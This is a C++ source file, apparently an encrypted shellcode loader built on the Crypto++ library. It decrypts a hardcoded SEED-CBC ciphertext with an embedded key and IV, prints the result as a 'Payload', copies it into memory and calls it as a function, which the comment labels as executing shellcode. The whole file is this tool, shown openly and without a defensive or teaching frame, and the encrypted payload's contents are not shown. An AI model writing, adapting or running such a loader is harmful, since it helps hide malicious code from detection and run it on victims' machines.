
//////////////////INCLUDE LIBRARY//////////////////////////
#include "iostream"
#include "fstream"
#include "cryptopp/seed.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/base64.h"
///////////////////END OF INCLUDE LIBRARY////////////////////////////

using namespace std;
using namespace CryptoPP;

string decode(string data)
{
   std::string decoded;
   StringSource(data, true,
      new HexDecoder(
         new StringSink(decoded)
      ) // HexEncoder
   ); // StringSource

	return decoded;
}

int main(int argc, char* argv[])
{
   AutoSeededRandomPool prng;
   std::string keys=decode("BCF3E494829A803E718DE4F9B5A4C8A3");
   std::string IVs=decode("2458B63AAFBA7902F346DE986EECD02B");

   SecByteBlock key((const byte*)keys.data(), keys.size());
   SecByteBlock iv((const byte*)IVs.data(), IVs.size());


string cipher="18AE65C47B6A0D93E2AF515C59490E230C772AB9C53B2EA9343F1C2E5A8C286FC30CEC183DB4EAD9299453003E2E45BA31E7388500EB0A144DE1CE05A167465780CCC8F5A43984867AA13769DF5AC744D55024DDC0320E3F957E353DF40B5A925D8219064C5961CE5DCF4D1577D8D25CD1831A6A6B16C37D7610658B67B02F31FC1EF6D7BBC7C38A915B39BFAA6430780C1E401402BA4816FCD01F89C74676EA1CA68D2EA50565207E5B739B0B906B84E6E960A7D0736685E1F33491E8FC76EA480288E124A71E725F404A63EFCA4E29CFB7AC88D3656DBFD796D732E6EACB90BD2C48BE1FC5753ACCB54EDA6F32B765BAC49DEE11C32B2DC6ABFD95180C12016E54ECF3DE60484ECC39082AAB5FC32988682880A68D2ECAE81B7F1C812D4B679E7CD6CED6C14B7244C688CDE6CF0EBB18BFFA461CFC60B0C9CA0FA35D2CD713";
   std::string encoded, recovered;

   try
   {
      CBC_Mode< SEED >::Decryption d;
      d.SetKeyWithIV(key, key.size(), iv);

      // The StreamTransformationFilter removes
      //  padding as required.
      StringSource s(cipher, true,(new HexDecoder( 
       new StreamTransformationFilter(d,
		new StringSink(recovered)))
       ) // StreamTransformationFilter
      ); // StringSource

      std::cout << "Payload is : " << recovered << std::endl;
   }
   catch(const CryptoPP::Exception& e)
   {
      std::cerr << e.what() << std::endl;
      exit(1);
   }

// Convert the decoded data to a char

	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);

// Execute the shellcode
   	int (*ret)() = (int(*)())writable;
	ret();

   return 0;
}
